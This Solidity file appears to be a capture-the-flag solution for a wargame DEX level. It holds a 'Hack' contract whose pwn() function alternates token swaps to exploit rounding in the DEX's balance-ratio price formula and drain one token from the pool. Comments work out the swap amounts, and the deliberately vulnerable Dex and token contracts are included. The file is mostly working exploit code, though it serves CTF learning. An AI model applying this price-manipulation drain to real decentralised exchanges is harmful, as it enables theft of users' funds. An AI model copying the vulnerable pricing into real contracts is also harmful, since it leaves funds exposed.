// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/IERC20.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable.sol";

//      token 1 | token 2
// 10 in  | 100 | 100 | 10 out
// 24 out | 110 | 90  | 10 in
// 24 in  | 86  | 110 | 30 out
// 41 out | 110 | 80  | 30 in
// 41 in  | 69  | 110 | 65 out
//        | 110 | 45  |
// last swap
// 110 = token2 amount in * balance of token 1 / balance of token 2
// 110 = token2 amoutn in * 110 /45
// 110 / 100 * 45 = token2 amount in
// 45 = token2 amount in

contract Hack{
    Dex dex;
    IERC20 token1;
    IERC20 token2;

    constructor(address dexAddress) {
        dex = Dex(dexAddress);
        token1 = IERC20(dex.token1());
        token2 = IERC20(dex.token2());
    }

    function pwn() external  {
        // 1. Approve both token from the wallet
        // 2. Then pwn()
        token1.transferFrom(msg.sender, address(this), 10);
        token2.transferFrom(msg.sender, address(this), 10);

        token1.approve(address(dex), type(uint).max);
        token2.approve(address(dex), type(uint).max);

        _swap(token1, token2);
        _swap(token2, token1);
        _swap(token1, token2);
        _swap(token2, token1);
        _swap(token1, token2);

        dex.swap(address(token2), address(token1), 45);
    }

    function _swap(IERC20 tokenIn, IERC20 tokenOut) private {
        dex.swap(address(tokenIn), address(tokenOut), tokenIn.balanceOf(address(this)));
    }
}

abstract contract Dex is Ownable {
    address public token1;
    address public token2;

    constructor() {}

    function setTokens(address _token1, address _token2) public onlyOwner {
        token1 = _token1;
        token2 = _token2;
    }

    function addLiquidity(address token_address, uint256 amount) public onlyOwner {
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    }

    function swap(address from, address to, uint256 amount) public {
        require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
        uint256 swapAmount = getSwapPrice(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }

    function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256) {
        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
    }

    function approve(address spender, uint256 amount) public {
        SwappableToken(token1).approve(msg.sender, spender, amount);
        SwappableToken(token2).approve(msg.sender, spender, amount);
    }

    function balanceOf(address token, address account) public view returns (uint256) {
        return IERC20(token).balanceOf(account);
    }
}

contract SwappableToken is ERC20 {
    address private _dex;

    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)
        ERC20(name, symbol)
    {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}